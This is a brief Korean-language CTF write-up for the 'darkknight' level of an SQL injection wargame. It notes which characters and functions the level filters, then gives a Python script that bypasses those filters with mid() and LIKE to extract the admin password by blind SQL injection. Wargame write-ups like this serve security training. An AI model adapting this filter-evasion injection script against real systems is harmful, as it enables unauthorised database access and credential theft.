# darkknight

* pw에서 '(싱글 쿼터)를 차단하고 있다.
* no에서 '(싱글 쿼터), substr, ascii, = 차단하고 있다.   
</br>

substr 대신 mid를 사용할 수 있다.   
</br>

```
import requests

headers = {'Cookie' : 'PHPSESSID=kova1t98feg40kpfqdboutfq2c'}
page = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?'

string = '0123456789abcdefghijklmnopqrstuvwxyz'

pw = ''
for i in range(1,9):
	for j in string:
		value = 'no=1 || id like "admin" %26%26 mid(pw,{},1) like "{}"#'.format(i,j)
		url = page+value
		response = requests.get(url, headers=headers)
		print j
		if "<h2>Hello admin</h2>" in response.text:
			pw += j
			print '[+] find : ' + pw
			break

print '[*] Password : '+ pw
```

